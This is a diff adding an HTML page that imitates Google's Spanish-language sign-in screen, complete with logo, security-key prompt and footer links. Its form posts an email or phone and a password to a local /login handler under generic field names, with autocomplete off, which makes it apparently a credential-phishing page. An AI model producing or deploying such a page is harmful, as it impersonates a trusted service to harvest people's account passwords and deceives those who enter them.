@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Cuentas de Google</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Roboto,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+.card{background:#fff;padding:48px 40px 36px;width:100%;max-width:450px;min-width:360px}
+.logo{display:flex;justify-content:center;margin-bottom:16px}
+.logo svg{width:75px;height:24px}
+h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:4px}
+.subtitle{text-align:center;color:#202124;font-size:16px;margin-bottom:32px}
+.form-group{margin-bottom:24px;position:relative}
+.form-group input{width:100%;padding:13px 15px 13px;border:1px solid #dadce0;border-radius:4px;font-size:16px;color:#202124;background:transparent;transition:border .2s}
+.form-group input:focus{outline:none;border:2px solid #1a73e8;padding:12px 14px 12px}
+.form-group input::placeholder{color:#5f6368}
+.form-group label{position:absolute;left:15px;top:50%;transform:translateY(-50%);color:#5f6368;font-size:16px;pointer-events:none;transition:all .2s;background:#fff;padding:0 4px}
+.form-group input:focus+label,.form-group input:not(:placeholder-shown)+label{top:0;font-size:12px;color:#1a73e8;transform:translateY(-50%)}
+.actions{display:flex;justify-content:space-between;align-items:center;margin-top:32px}
+.actions a{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none}
+.actions a:hover{text-decoration:underline}
+.btn{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:20px;font-size:14px;font-weight:500;cursor:pointer;min-width:72px}
+.btn:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.3)}
+.create{margin-top:24px;font-size:14px;color:#202124}
+.create a{color:#1a73e8;text-decoration:none;font-weight:500}
+.create a:hover{text-decoration:underline}
+.footer{margin-top:32px;display:flex;gap:16px;justify-content:center;font-size:12px}
+.footer a{color:#5f6368;text-decoration:none}
+.footer a:hover{text-decoration:underline}
+.use-passkey{display:flex;align-items:center;gap:8px;margin-bottom:24px;padding:12px;border:1px solid #dadce0;border-radius:8px;cursor:pointer}
+.use-passkey:hover{background:#f8f9fa}
+.use-passkey svg{width:24px;height:24px;fill:#1a73e8}
+.use-passkey span{font-size:14px;color:#1a73e8;font-weight:500}
+@media(max-width:500px){.card{padding:24px 20px;min-width:auto}}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo">
+<svg viewBox="0 0 75 24"><path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.24 1.56-.96 2.88-2.04 3.96l3.24 2.52c1.92-1.8 3-4.44 3-7.56 0-.72-.06-1.44-.18-2.16H9.24z"/><path fill="#EA4335" d="M3.84 15.66c-.72-1.44-1.14-3.12-1.14-4.86s.42-3.42 1.14-4.86L.6 3.42C.24 4.92 0 6.48 0 8.1s.24 3.18.6 4.68l3.24-2.52z"/><path fill="#FBBC05" d="M15.12 18.18c-1.56 1.44-3.72 2.28-6.12 2.28-3.24 0-6-2.16-7.08-5.1L.6 17.88C2.28 21.12 5.64 23.4 9.48 23.4c2.52 0 4.92-.84 6.72-2.28l-1.08-2.94z"/><path fill="#34A853" d="M15.12 5.82c.72 1.44 1.14 3.12 1.14 4.98 0 1.86-.42 3.54-1.14 4.98l1.08 2.94c1.68-1.56 3-3.72 3.6-6.36.36-1.56.54-3.18.54-4.86 0-1.68-.18-3.3-.54-4.86-1.08-2.94-3.84-5.1-7.08-5.1-2.52 0-4.92.84-6.72 2.28l3.24 2.52c1.08-.96 2.52-1.56 4.08-1.56 1.56 0 3 .6 4.08 1.56l-1.08 2.94z"/></svg>
+</div>
+<h1>Iniciar sesi&oacute;n</h1>
+<p class="subtitle">Usa tu cuenta de Google</p>
+<div class="use-passkey">
+<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+<span>Usar tu llave de seguridad</span>
+</div>
+<form action="/login" method="POST">
+<div class="form-group">
+<input type="text" name="field1" placeholder=" " required autocomplete="off">
+<label>Correo electr&oacute;nico o tel&eacute;fono</label>
+</div>
+<div class="form-group">
+<input type="password" name="field2" placeholder=" " required autocomplete="off">
+<label>Contrase&ntilde;a</label>
+</div>
+<div class="actions">
+<a href="#">&iquest;Olvidaste tu contrase&ntilde;a?</a>
+<button type="submit" class="btn">Siguiente</button>
+</div>
+</form>
+<div class="create">&iquest;No tienes cuenta? <a href="#">Crear cuenta</a></div>
+<div class="footer">
+<a href="#">Ayuda</a>
+<a href="#">Privacidad</a>
+<a href="#">T&eacute;rminos</a>
+</div>
+</div>
+</body>
+</html>
